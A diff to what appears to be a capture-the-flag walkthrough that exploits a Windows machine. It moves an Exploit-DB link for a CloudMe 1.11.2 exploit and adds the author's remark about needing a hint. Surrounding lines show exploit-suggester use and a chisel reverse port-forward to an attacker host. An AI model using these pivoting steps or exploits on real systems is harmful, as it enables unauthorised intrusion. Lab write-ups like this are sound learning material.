@@ -153,6 +153,13 @@ python /opt/Windows-Exploit-Suggester/windows-exploit-suggester.py \
 grep -i listening netstat.log # careful, only for english versions!
 ```
 
+I think at this point you are supposed to find the icloudme setup file
+in the download folder and deduce that one of the locally bound services
+is just that. I did not, had to look up a hint.
+
+iCloudme 1.11.2 is vulnerable to this exploit:
+* https://www.exploit-db.com/exploits/48389
+
 > listen on Kali
 
 ```sh
@@ -164,10 +171,6 @@ grep -i listening netstat.log # careful, only for english versions!
 ```sh
 chisel.exe client 10.10.14.69:12345 R:8888:127.0.0.1:8888
 ```
-
-iCloudme 1.11.2 is vulnerable to this exploit:
-
-* https://www.exploit-db.com/exploits/48389
 
 > on Kali
 ```sh
